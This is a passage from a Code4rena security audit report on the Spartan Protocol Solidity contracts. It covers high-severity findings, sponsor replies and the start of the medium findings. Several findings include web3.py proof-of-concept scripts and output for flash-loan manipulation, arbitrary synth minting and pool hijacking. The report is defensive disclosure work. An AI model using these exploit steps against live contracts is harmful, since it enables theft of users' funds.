manipulated</a></li>\n</ul>\n</li>\n<li><a href=\"#non-critical-findings\">Non-Critical findings</a></li>\n<li><a href=\"#gas-optimization-25\">Gas Optimization (25)</a></li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode 432n4 (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 code contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the code contest outlined in this document, C4 conducted an analysis of Spartan smart contract system written in Solidity. The code contest took place between July 14—July 21.\n\n## Wardens\n\n18 Wardens contributed reports to the Spartan code contest:\n\n1. [cmichel](https://twitter.com/cmichelio)\n2. [jonah1005](https://twitter.com/jonah1005w)\n3. [0xRajeev](https://twitter.com/0xRajeev)\n4. [shw](https://github.com/x9453)\n5. [hickuphh3](https://twitter.com/HickupH)\n6. [gpersoon](https://twitter.com/gpersoon)\n7. [0xsanson](https://github.com/0xsanson)\n8. [tensors](https://twitter.com/Tensors8)\n9. [a_delamo](https://twitter.com/a_delamo)\n10. [GalloDaSballo](https://twitter.com/gallodasballo)\n11. [natus](https://github.com/SP-Nate)\n12. maplesyrup ([heiho1](https://github.com/heiho1) and [thisguy__](https://twitter.com/eriksal1217))\n13. [Jmukesh](https://twitter.com/MukeshJ_eth)\n14. [heiho1](https://github.com/heiho1)\n15. [hrkrshnn](https://twitter.com/_hrkrshnn)\n16. [zer0dot](https://twitter.com/zer0dots)\n17. [k](https://twitter.com/kylriley)\n18. [7811](https://twitter.com/cranium7811)\n\nThis contest was judged by [ghoul.sol](https://twitter.com/ghoulsol).\n\nFinal report assembled by [moneylegobatman](https://twitter.com/money_lego) and [ninek](https://twitter.com/_ninek_).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 63 unique vulnerabilities. All of the issues presented here are linked back to their original finding\n\nOf these vulnerabilities, 13 received a risk rating in the category of HIGH severity, 15 received a risk rating in the category of MEDIUM severity, and 35 received a risk rating in the category of LOW severity.\n\nC4 analysis also identified 44 non-critical recommendations and 25 gas optimizations.\n\n# Scope\n\nThe code under review can be found within the [C4 Spartan Protocol code contest repository](https://github.com/code-423n4/2021-07-spartan) is comprised of 29 smart contracts written in the Solidity programming language and included 2,506 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code423n4.com).\n\n# High Risk Findings (13)\n\n## [[H-01] `SynthVault` withdraw forfeits rewards](https://github.com/code-423n4/2021-07-spartan-findings/issues/168)\n_Submitted by cmichel_\n\n\nThe `SynthVault.withdraw` function does not claim the user's rewards. It decreases the user's weight and therefore they are forfeiting their accumulated rewards.\nThe `synthReward` variable in `_processWithdraw` is also never used - it was probably intended that this variable captures the claimed rewards.\n\nUsually, withdrawal functions claim rewards first but this one does not. A user that withdraws loses all their accumulated rewards.\n\nRecommend claiming the rewards with the user's deposited balance first in `withdraw`.\n\n**[verifyfirst (Spartan) confirmed but disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/168#issuecomment-884642575):**\n > We understand there is a risk of losing unclaimed rewards if a user directly interacts with the synth-vault and not the DAPP.\n> This is a design choice to protect the withdrawal function.\n> We affirm the synthReward variable to be culled.\n\n## [[H-02] `Pool.sol` & `Synth.sol`: Failing Max Value Allowance](https://github.com/code-423n4/2021-07-spartan-findings/issues/29)\n_Submitted by hickuphh3, also found by shw, jonah1005, 0xRajeev and cmichel_\n\nIn the `_approve` function, if the allowance passed in is `type(uint256).max`, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.\n\nThis also makes the comment `// No need to re-approve if already max` misleading, because the max allowance attainable is `type(uint256).max - 1`, and re-approval does happen in this case.\n\nThis affects the `approveAndCall` implementation since it uses `type(uint256).max` as the allowance amount, but the resulting allowance set is zero.\n\nRecommend keeping it simple and removing the condition.\n\n```jsx\nfunction _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"!owner\");\n    require(spender != address(0), \"!spender\");\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n}\n```\n\n**[SamusElderg (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-885456808):**\n > We acknowledge the issue in the max approval for approveAndCall, which we don't use.\n> Furthermore, the issue is only a problem if a user directly approves a maximum possible amount which would mean they are assuming trust in the contract.\n>\n> We will also change _approve in the pool and synth contracts.\n> Risk, as outlined above, is low.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-894851446):**\n > This is high risk as explained in #152\n\n## [[H-03] Result of `transfer` / `transferFrom` not checked](https://github.com/code-423n4/2021-07-spartan-findings/issues/8)\n_Submitted by gpersoon, also found by jonah1005, zer0dot, 0xRajeev, JMukesh, cmichel, k, shw, 7811, heiho1 and maplesyrup._\n\nA call to `transferFrom` or `transfer` is frequently done without checking the results. For certain ERC20 tokens, if insufficient tokens are present, no revert occurs but a result of \"false\" is returned. It's important to check this. If you don't, you could mint tokens without have received sufficient tokens to do so and could loose funds. Its also a best practice to check this.\n\nRecommend always checking the result of `transferFrom` and `transfer`.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-883828361):**\n > The intention was to not allow non-standard tokens with non-boolean returns however in the interest of future proofing the protocol we agree with this issue\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/8#issuecomment-894852860):**\n > There are a lot of reported issues in relation of non-standard ERC20 and `transfer` return values. Some wardens report it all in one issue, some divided it into multiple issues. To keep playing field equal, I'll keep one issue per warden and make others invalid.\n\n## [[H-04] Members lose SPARTA tokens in `removeLiquiditySingle()`](https://github.com/code-423n4/2021-07-spartan-findings/issues/133)\n_Submitted by 0xRajeev, also found by cmichel and XXX_\n\nWhen a member calls `removeLiquiditySingle()` requesting only SPARTA in return, i.e. `toBASE` = true, the LP tokens are transferred to the Pool to withdraw the constituent SPARTA and TOKENs back to the Router. The withdrawn TOKENs are then transferred back to the Pool to convert to SPARTA and directly transferred to the member from the Pool. However, the member’s SPARTA are left behind in the Router instead of being returned along with converted SPARTA from the Pool.\n\nIn other words, the `_member`'s BASE SPARTA tokens that were removed from the Pool along with the TOKENs are never sent back to the` _member` because the `_token`'s transferred to the Pool are converted to SPARTA and only those are sent back to member directly from the Pool via `swapTo()`.\n\nThis effectively results in member losing the SPARTA component of their Pool LP tokens which get left behind in the Router and are possibly claimed by future transactions that remove SPARTA from Router.\n\n[LPs sent to Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L121), [SPARTA and TOKENs withdrawn from Pool to Router](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L122), [TOKENs from Router sent to Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L126), and [TOKENs in Pool converted to BASE SPARTA and sent to member directly from the Pool](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L127).\n\n**Recommend**:\n1. BASE SPARTA should also be transferred to the Pool before `swapTo()` so they get sent to the member along with the converted TOKENs via `swapTo()`\n2. Use `swap(BASE)` instead of `swapTo()` so that TOKENs are swapped for BASE SPARTA in Pool and sent back to ROUTER. Then send all the SPARTA from ROUTER to member.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/133#issuecomment-884607584):**\n > This bug was missed in a last minute edit before pushing to code423n4, wouldn't have made it past testNet testing.\n> However, it is a good find.\n\n## [[H-05] Synth `realise` is vulnerable to flash loan attacks](https://github.com/code-423n4/2021-07-spartan-findings/issues/40)\n_Submitted by jonah1005, also found by a_delamo_\n\nSynth `realise` function calculates `baseValueLP` and `baseValueSynth` base on AMM spot price which is vulnerable to flash loan attack. `Synth`'s lp is subject to `realise` whenever the AMM ratio is different than Synth's debt ratio.\n\nThe attack does not necessarily require a flash loan. A big whale of the lp token holders could keep calling `realise` by shifting token ratio of AMM pool back and forth.\n\nThe vulnerability is located at `Synth.sol` [L187-L199](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L187-L199). Where the formula [here](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L114-L126) is dangerous.\n\nHere's a script for conducting flashloan attack:\n```python\nflashloan_amount = init_amount\nuser = w3.eth.accounts[0]\nmarked_token.functions.transfer(user, flashloan_amount).transact()\nmarked_token.functions.transfer(token_pool.address, flashloan_amount).transact({'from': user})\ntoken_pool.functions.addForMember(user).transact({'from': user})\nreceived_lp = token_pool.functions.balanceOf(user).call()\nsynth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\ntoken_synth.functions.realise(token_pool.address).transact()\ntoken_pool.functions.transfer(token_pool.address, received_lp).transact({'from': user})\ntoken_pool.functions.removeForMember(user).transact({'from': user})\ntoken_synth.functions.realise(token_pool.address).transact()\nsynth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\nprint('synth_lp_balance_after_realise', synth_balance_after_realise)\nprint('synth_lp_balance_before_realise', synth_balance_before_realise)\n\n```\nOutput:\n```\nsynth_balance_after_realise 1317859964829313908162\nsynth_balance_before_realise 2063953488372093023256\n```\n\nCalculating Lp token's value base on AMM protocol is known to be dangerous.\nThere are a few steps that might solve the issue:\n1. calculate token's price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.\n2. calculate lp token value based on anti-flashloan formula.  Alpha finance's formula is a good reference: https://blog.alphafinance.io/fair-lp-token-pricing\n\n**[verifyfirst (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/40#issuecomment-883856664):**\n > A proposal has been suggested to limit the use of realise() for a DAO proposal. This will allow only liquidity providers to choose the outcome of a function that directly affects them.\n>\n\n## [[H-06] `SynthVault` rewards can be gamed](https://github.com/code-423n4/2021-07-spartan-findings/issues/166)\n_Submitted by cmichel_\n\nThe `SynthVault._deposit` function adds `weight` for the user that depends on the spot value of the deposit synth amount in `BASE`.\n\nThis spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity.\nHowever, the reward (see `calcReward`) is measured in BASE tokens unrelated to the pool.\nTherefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:\n\n1. Manipulate the pool spot price of the `iSYNTH(_synth).LayerONE()` pool by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price.\n2. Call `SynthVault.depositForMember` and deposit a _small_ amount of synth token. The `iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)` will return an inflated weight due to the price.\n3. Optionally drip more `BASE` into the pool and repeat the deposits\n4. Drip back `token` to the pool to rebalance it\n\nThe user's `weight` is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards. The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.\n\nRecommend tracking a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/166#issuecomment-884641152):**\n > There is already a discussion in place to change spot rate to swap rate calculation for weights.\n\n## [[H-07] Missing slippage checks](https://github.com/code-423n4/2021-07-spartan-findings/issues/171)\n_Submitted by cmichel, also found by tensors_\n\nThere are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated.\nThis means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%. See issue page for referenced code.\n\nRecommend adding a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.\n\n**[verifyfirst (Spartan) acknowledge:](https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-884593067)**\n> We acknowledge the issue for the protocol's AMM, but if this becomes a large issue in the future, the router is easily upgradeable to include a minimum rate parameter.\n\n**[SamusEldburg (Spartan) confirmed and disagreed with severity:](https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-889638485)**\n> Have changed this to confirmed; even though we already were aware of it; we have discussed and are happy to add in a UI-handed arg for minAmount now rather than reactively in the future. Disagree with severity though; this wasn't a problem with V1 at all.\n\n**[ghoul-sol (Judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/85#issuecomment-894863717):**\n> I'll keep high risk as sandwich attacks are very common and risk of getting a bad swap is real.\n\n## [[H-08] Dividend reward can be gamed](https://github.com/code-423n4/2021-07-spartan-findings/issues/182)\n_Submitted by cmichel_\n\nThe `Router.addDividend` function tells the reserve to send dividends to the pool depending on the fees.\n\n- The attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent.\n- The `normalAverageFee` variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool `arrayFeeSize` (20) times (use `buyTo`). The fees of the single wei trades will be zero and thus the `normalAverageFee` will also be zero as, see `addTradeFee`.\n- The attacker then does a trade that generates some non-zero fees, setting the `normalAverageFee` to this trade's fee. The `feeDividend` is then computed as `_fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2`. Half of the `dailyAllocation` is sent to the pool.\n- The attacker repeats the above steps until the reserve is almost empty. Each time the `dailyAllocation` gets smaller but it's still possible to withdraw almost all of it.\n- They redeem their LP tokens and gain a share of the profits\n\nThe reserve can be emptied by the attacker.\n\nCounting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short.\nI think a better idea is to compute the dividends based on **volume** traded over a timespan instead of looking at individual trades.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-885412630):**\n > Only very deep pools will be curated for dividends.\n> Variables can be changed reactively to alter the dividends.\n> Whilst we were aware of this and feel the attack is limited its sparked some discussion for some new ideas to solve this.\n>\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-894864375):**\n > Keeping high risk as the report is valid\n\n## [[H-09] arbitrary synth mint/burn from pool](https://github.com/code-423n4/2021-07-spartan-findings/issues/20)\n_Submitted by jonah1005_\n\n`Pool` can mint arbitrary `Synth` provided as long as it's a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.\n\n[Pool's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L229-L242), [Synth's mintSynth logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L165-L171), and [Synth's authorization logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242).\n\n\nThe price of the synthetics to be mint is calculated in `Pool` based on the AMM price of the current Pool\n\nHere's a web3.py script of minting arbitrary `Synth` in a pool.\nFor simplicity, two pools are set with the assumption that link is 10x expensive than dai.\n\n```python\nsparta_amount = 100 * 10**18\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(link_pool.address, sparta_amount).transact({'from': user})\nlink_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from link pool:', after_link_synth - initail_link_synth)\n\nsparta_amount = 100 * 10**18\ninitail_link_synth = link_synth.functions.balanceOf(user).call()\nbase.functions.transfer(dai_pool.address, sparta_amount).transact({'from': user})\ndai_pool.functions.mintSynth(link_synth.address, user).transact({'from': user})\nafter_link_synth = link_synth.functions.balanceOf(user).call()\n\nprint('get link synth amount from dai pool:', after_link_synth - initail_link_synth)\n\n```\n\nThe log of the above script\n```solidity\nget link synth amount from link pool: 97078046905036524413\nget link synth amount from dai pool: 970780469050365244136\n```\nRecommend Checking the provided synth's underlying token in `mintSynth`\n```solidity\nrequire(iSYNTH(synthOut).LayerONE() == TOKEN, \"invalid synth\");\n```\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/20#issuecomment-883837548):**\n > We agree and appreciate this finding being valid high risk issue.\n\n## [[H-10] Hijack token pool by burning liquidity token](https://github.com/code-423n4/2021-07-spartan-findings/issues/38)\n_Submitted by jonah1005_\n\n`Pool` allows users to burn lp tokens without withdrawing the tokens. This allows the hacker to mutate the pools' rate to a point that no one can get any lp token anymore (even if depositing token).\n\nThe liquidity tokens are calculated at `Utils:calcLiquidityUnits`\n```solidity\n// units = ((P (t B + T b))/(2 T B)) * slipAdjustment\n// P * (part1 + part2) / (part3) * slipAdjustment\nuint slipAdjustment = getSlipAdustment(b, B, t, T);\nuint part1 = t*(B);\nuint part2 = T*(b);\nuint part3 = T*(B)*(2);\nuint _units = (P * (part1 + (part2))) / (part3);\nreturn _units * slipAdjustment / one;  // Divide by 10**18\n```\nwhere `P` stands for `totalSupply` of current Pool. If `P` is too small (e.g, 1) then all the units would be rounding to 0.\n\nSince any person can create a `Pool` at `PoolFactory`, hackers can create a Pool and burn his lp and set `totalSupply` to 1. He will be the only person who owns the Pool's lp from now on. [Pool's burn logic](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L146) and [Utils' lp token formula](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Utils.sol#L80).\n\nHere's a script of a user depositing 1M token to a pool where `totalSupply` equals 1\n\n```solidity\ndai_pool.functions.burn(init_amount-1).transact()\nprint('total supply', dai_pool.functions.totalSupply().call())\ndai.functions.transfer(dai_pool.address, 1000000 * 10**18).transact()\ndai_pool.functions.addForMember(user).transact()\nprint('lp received from depositing 1M dai: ', dai_pool.functions.balanceOf(user).call())\n```\n\nOutput:\n```solidity\ntotal supply 1\nlp received from depositing 1M dai:  0\n```\n\nRecommend removing `burn` or restrict it to privileged users only.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/38#issuecomment-883855367):**\n > We agree to this issue and will restrict access to burn in the pool contract.\n> We have already proposed adding a 1 week withdraw coolOff for all users per pool from the genesis of creation. Users can only add liquidity within this period.\n\n## [[H-11] Misuse of AMM model on minting `Synth` (resubmit to add more detail)](https://github.com/code-423n4/2021-07-spartan-findings/issues/59)\n_Submitted by jonah1005_\n\n`Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint `Synth`, it's always cheaper to mint `synth` than swap the tokens.\n\nThe synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.\n\nIn [Pool's mint `synth`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242), The `synth` amount is calculated at L:232\n```solidity\nuint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount);\n```\nwhich is the same as swapping base to token at L:287\n```solidity\nuint256 _X = baseAmount;\nuint256 _Y = tokenAmount;\n_y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output\n```\n\nHowever, while swapping tokens decrease pool's token, mint just mint it out of the air.\n\nHere's a POC:\nSwap sparta to token for ten times\n```python\nfor i in range(10):\n    amount = 10 * 10**18\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.swapTo(token.address, user).transact()\n```\n\nMint `Synth` for ten times\n```python\nfor i in range(10):\n    amount = 10 * 10**18\n    transfer_amount = int(amount/10)\n    base.functions.transfer(token_pool.address, transfer_amount).transact()\n    token_pool.functions.mintSynth(token_synth.address, user).transact()\n```\n\nThe Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.\n\n\nThe debt should be considered in the AMM pool so I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it:\n```solidity\nuint256 public debt;\nfunction _tokenAmount() returns (uint256) {\n    return tokenAmount - debt;\n}\n\n// Swap SPARTA for Synths\nfunction mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {\n    require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, \"!synth\"); // Must be a valid Synth\n    uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount\n\n    // Use tokenAmount - debt to calculate the value\n    uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN\n\n    // increment the debt\n    debt += output\n\n    uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted\n    _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount\n    uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN\n    fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA\n    _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold\n    iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user\n    _addPoolMetrics(fee); // Add slip fee to the revenue metrics\n    emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);\n    return (output, fee);\n}\n```\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/59#issuecomment-883866084):**\n > We agree with the issue submitted, discussions are already in progress around ensuring the mint rate considers the floating debt.\n> Potential high risk, however, hard to create a scenario to prove this.\n\n## [[H-12] wrong `calcLiquidityHoldings` that leads to dead fund in the Pool](https://github.com/code-423n4/2021-07-spartan-findings/issues/71)\n_Submitted by jonah1005_\n\nThe lptoken minted by the `Pool` contract is actually the mix of two types of tokens. One is the original lptokens user get by calling `addForMember`. This lpToken is similar to lp of Uniswap, Crv, Sushi, ... etc. The other one is the debt-lp token the Synth contract will get when the user calls `mintSynth`. The `Synth` contract can only withdraw `Sparta` for burning debt-lp. Mixing two types of lp would raise several issues.\n\nLP user would not get their fair share when they burn the lP.\n1. Alice adds liquidity with Sparta 1000 and token B 1000 and create a new Pool.\n2. Bob mint Synth with 1000 Sparta and get debt.\n3. Alice withdraw all lp Token\n4. Bob burn all Synth.\n\nThe pool would end up left behind a lot of token B in the Pool while there's no lp holder.\n\nI would say this is a high-risk vulnerability since it pauses unspoken risks and losses for all users (all the time)\n\nThe logic of [burn original lp](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L192-L202) and [burn debt-lp](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Pool.sol#L244-L257).\n\nI do not know whether this is the team's design choice or its composite with a series of bugs. If this is the original design, I do not come up with a fix. It's a bit similar to the impermanent loss. However, the loss would be left behind in the Pool. This is more complicated and maybe worse than the impermanent loss. If this is the design choice, I think it's worth emphasize and explain to the users.\n\n**[verifyfirst (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-884588473):**\n > We are in discussion of a viable solution to limit the effects of a bank run.\n> One example is limiting the minted synths based on the depth of its underlying pool.\n>\n\n**[SamusElderg (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/71#issuecomment-892408842):**\n > LP units are only used for accounting; even if they were drained to zero or vice versa on the synth contract; they would result in the same redemption value when burning. Hence the risk is low; however there is already discussions on implementing controls to synths including a maximum synthSupply vs tokenDepth ratio to prevent top-heavy synths ontop of the pools which isn't really specific to the warden's scenario; however does help limit those 'unknowns' that the warden addressed.\n\n## [[H-13] Flash loan manipulation on `getPoolShareWeight` of `Utils`](https://github.com/code-423n4/2021-07-spartan-findings/issues/238)\n_Submitted by shw_\n\nThe `getPoolShareWeight` function returns a user's pool share weight by calculating how many SPARTAN the user's LP tokens account for. However, this approach is vulnerable to flash loan manipulation since an attacker can swap a large number of TOKEN to SPARTAN to increase the number of SPARTAN in the pool, thus effectively increasing his pool share weight.\n\nAccording to the implementation of `getPoolShareWeight,` a user's pool share weight is calculated by `uints * baseAmount / totalSupply`, where `uints` is the number of user's LP tokens, `totalSupply` is the total supply of LP tokens, and `baseAmount` is the number of SPARTAN in the pool. Thus, a user's pool share weight is proportional to the number of SPARTAN in the pool. Consider the following attack scenario:\n\n1. Supposing the attacked pool is SPARTAN-WBNB. The attacker first prepares some LP tokens (WBNB-SPP) by adding liquidity to the pool.\n2. The attacker then swaps a large number of WBNB to SPARTAN, which increases the pool's `baseAmount`. He could split his trade into small amounts to reduce slip-based fees.\n3. The attacker now wants to increase his weight in the `DaoVault`. He adds his LP tokens to the pool by calling the `deposit` function of `Dao.`\n4. `Dao` then calls `depositLP` of `DaoVault`, causing the attacker's weight to be recalculated. Due to the large proportion of SPARTAN in the pool, the attacker's weight is artificially increased.\n5. With a higher member weight, the attacker can, for example, vote the current proposal with more votes than he should have or obtain more rewards when calling `harvest` of the `Dao` contract.\n6. The attacker then swaps back SPARTAN to WBNB and only loses the slip-based fees.\n\nReferenced code:\n[Utils.sol#L46-L50](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L46-L50),\n[Utils.sol#L70-L77](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Utils.sol#L70-L77),\n[DaoVault.sol#L44-L56](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/DaoVault.sol#L44-L56),\n[Dao.sol#L201](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L201), and\n[Dao.sol#L570](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Dao.sol#L570).\n\nA possible mitigation is to record the current timestamp when a user's weight in the `DaoVault` or `BondVault` is recalculated and force the new weight to take effect only after a certain period, e.g., a block time. This would prevent the attacker from launching the attack since there is typically no guarantee that he could arbitrage the WBNB back in the next block.\n\n**[SamusElderg (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-886351432):**\n > Recommended mitigation has been included in contributors ongoing discussions to make this more resistant to manipulation\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/238#issuecomment-894866142):**\n > Keeping high risk because of impact\n\n# Medium Risk Findings (14)\n\n## [[M-01] `Dao.sol`: Insufficient validation for proposal creation](https://github.com/code-423n4/2021-07-spartan-findings/issues/43)\n_Submitted by hickuphh3, 0xRajeev, also found by gpersoon and shw_\n\nIn general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.\n\n- The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all.\n- Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.\n\nAll of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).\n\n**Recommended Steps**:\n1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,\n    - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types\n    - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types\n    - `newParamProposal()` should only allow `COOL_OFF` and `ERAS_TO_EARN` proposal types\n2. Perhaps have a \"catch-all-else\" proposal that will only call `_completeProposal()` in `finaliseProposal()`\n\n```jsx\nfunction finaliseProposal() external {\n\t...\n\t} else if (isEqual(_type, 'ADD_CURATED_POOL')){\n\t\t_addCuratedPool(currentProposal);\n  } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n    _removeCuratedPool(currentProposal);\n  } else {\n\t\tcompleteProposal(_proposalID);\n\t}\n```\n\n3. Do null validation checks in `newAddressProposal()` and `newParamProposal()`\n\n```jsx\nfunction newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n    require(proposedAddress != address(0), \"!address\");\n\t\t// TODO: validate typeStr\n\t\t...\n}\n\nfunction newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n    require(param != 0, \"!param\");\n\t\t// TODO: validate typeStr\n\t\t...\n}\n```\n\n**[verifyfirst (Spartan) confirmed and disagreed with 